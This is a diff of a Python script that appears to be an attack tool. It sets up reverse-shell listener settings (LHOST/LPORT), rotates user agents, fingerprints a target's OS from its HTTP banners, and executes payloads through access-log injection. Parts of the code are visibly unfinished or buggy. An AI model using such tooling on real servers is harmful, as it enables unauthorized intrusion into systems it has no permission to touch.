@@ -8,16 +8,27 @@ import requests.exceptions
 import random
 import argparse
 import socket
+import pyping
+import core
+from core import *
 
 from argparse import RawTextHelpFormatter
 from urllib.parse import urlsplit
 from urllib.parse import urlparse
 from collections import deque
 
+def checkUrl(url):
+    if(lhost):
+        ipRegex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
+        if(re.match(ipRegex, lhost) is None):
+            return False
+        return True
+
+#Testing
 def checkArgs(url, lhost, lport):
     #Checking url
     urlRegex = re.compile(
-        r'^(?:http|ftp)s?://' # http:// or https://
+        r'^(?:http|ftp)s?://' # http:// or https:// or ftp://
         r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
         r'localhost|' #localhost...
         r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
@@ -40,7 +51,7 @@ def checkArgs(url, lhost, lport):
         if(lport < 1 or lport > 65534):
             print("LPORT " + str(lport) + " not valid, extiting...")
             sys.exit(-1)
-
+#OK
 def prepareHeaders():
     user_agents = [
                             "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
@@ -67,7 +78,13 @@ def prepareHeaders():
 def addHeader(newKey, newVal, headers):
     headers[newKey] = newVal
 
+#Returns IP of specified URL
+#TESTING
+def urlToIpAddress(url):
+    return socket.gethostbyname(url)
+
 #Payload is selected
+#Testing
 def preparePayloads(payload):
     payloads = {}
     #TODO perl, ruby, java
@@ -155,98 +172,65 @@ def exploit_access_log_injection(exploit, payload, headers):
             #Execute payload
             res = requests.get(exploit+line, headers = headers)
 
-def http_banner_grabber(ip, port=80, method="HEAD",
-                        timeout=60, http_type="HTTP/1.1"):
-    assert method in ['GET', 'HEAD']
-    # @see: http://stackoverflow.com/q/246859/538284
-    assert http_type in ['HTTP/0.9', "HTTP/1.0", 'HTTP/1.1']
-    cr_lf = '\r\n'
-    lf_lf = '\n\n'
-    crlf_crlf = cr_lf + cr_lf
-    res_sep = ''
-    # how much read from buffer socket in every read
-    rec_chunk = 4096
-    s = socket.socket()
-    s.settimeout(timeout)
-    s.connect((ip, port))
-    # the req_data is like 'HEAD HTTP/1.1 \r\n'
-    req_data = "{} / {}{}".format(method, http_type, cr_lf)
-    # if is a HTTP 1.1 protocol request,
-    if http_type == "HTTP/1.1":
-        # then we need to send Host header (we send ip instead of host here!)
-        # adding host header to req_data like 'Host: google.com:80\r\n'
-        req_data += 'Host: {}:{}{}'.format(ip, port, cr_lf)
-        # set connection header to close for HTTP 1.1
-        # adding connection header to req_data like 'Connection: close\r\n'
-        req_data += "Connection: close{}".format(cr_lf)
-    # headers join together with `\r\n` and ends with `\r\n\r\n`
-    # adding '\r\n' to end of req_data
-    req_data += cr_lf
-    # the s.send() method may send only partial content. 
-    # so we used s.sendall()
-    s.sendall(req_data.encode())
-    res_data = b''
-    # default maximum header response is different in web servers: 4k, 8k, 16k
-    # @see: http://stackoverflow.com/a/8623061/538284
-    # the s.recv(n) method may receive less than n bytes, 
-    # so we used it in while.
-    while 1:
-        try:
-            chunk = s.recv(rec_chunk)
-            res_data += chunk
-        except socket.error:
-            break
-        if not chunk:
-            break
-    if res_data:
-        # decode `res_data` after reading all content of data buffer
-        res_data = res_data.decode()
-    else:
-        return '', ''
-    # detect header and body separated that is '\r\n\r\n' or '\n\n'
-    if crlf_crlf in res_data:
-        res_sep = crlf_crlf
-    elif lf_lf in res_data:
-        res_sep = lf_lf
-    # for under HTTP/1.0 request type for servers doesn't support it
-    #  and servers send just send body without header !
-    if res_sep not in [crlf_crlf, lf_lf] or res_data.startswith('<'):
-        return '', res_data
-    # split header and data section from
-    # `HEADER\r\n\r\nBODY` response or `HEADER\n\nBODY` response
-    content = res_data.split(res_sep)
-    banner, body = "".join(content[:1]), "".join(content[1:])
-    return banner, body
+#Testing
+#Not working on all sites?
+def web_banner_grabber(ip, port):
+    x = requests.head(url)
+    return (str(x.headers))
 
 def detectOS():
-    linux = ['Ubuntu', 'Debian', 'Fedora', 'Linux', 'Arch', 'nix', 'Parrot', 'Kali', 'Suse', 'Cent', 'Red', 'Gecko', 'Manjaro', 'nux', 'Slack']
-    windows = ['Windows', 'windows', 'IIS', 'iis', '.net', '.NET', 'Microsoft', 'microsoft']
+    linux = ['Ubuntu', 'Debian', 'Fedora', 'Linux', 'Arch', 'Parrot', 'Kali', 'Suse', 'Cent', 'Red', 'Gecko', 'Manjaro', 'nux', 'Slack']
+    windows = ['Windows', 'windows', 'IIS', 'iis', 'Microsoft', 'microsoft']
 
     if(verbose):
         print("Detecting OS version...")
 
-    web_banner = http_banner_grabber(lhost, 80)
-    web_banner = ''.join(web_banner)
-    if(web_banner is None):
-        web_banner = http_banner_grabber(lhost, 443) #TODO more elegant method, maybe detect port based off of URL
-        web_banner = ''.join(web_banner)
+    u = urlparse(url)
+    port = u.port
+    if(port is None):
+        if('http://' in url):
+            port = 80
+        elif('https://' in url):
+            port = 443
+
+    #Convert url to IP address
+    spltAr = url.split("://")
+    i = (0,1)[len(spltAr)>1]
+    ip = spltAr[i].split("?")[0].split('/')[0].split(':')[0].lower()
+
+    banner = web_banner_grabber(str(ip), port)
+    banner = ''.join(banner)
+    print(banner)
 
     for l in linux:
-        if(l in web_banner):
+        if(l in banner):
                 if(verbose):
                     print("Target is probably running Linux")
-                return str("Linux")
-    for w in windows:
+                #return str("Linux")
 
-            if(w in web_banner):
+    for w in windows:
+            if(w in banner):
                 if(verbose):
                     print("Target is probably running Windows")
-                return str("Windows")
+                #return str("Windows")
+
+    if('gws' in banner or 'GWS' in banner):
+        if(verbose):
+            print("Target is probably Google Web Server")
+        #return str("GoogleWebServer")
+
+    if('cloud' in banner or 'Cloud' in banner):
+        if(verbose):
+            print("Target is probably running on cloud")
+        #return str("Cloud")
+
+    r = pyping.ping(ip)
+    print(r.ret_code)
 
 def main():
     headers = prepareHeaders() #OK
 
-    os = detectOS() #Can be better
+    os = detectOS()
     #exploit = exploitFinder(headers, os) #Testing
     
     # If autoexploit is set, check if correct payload method is provided
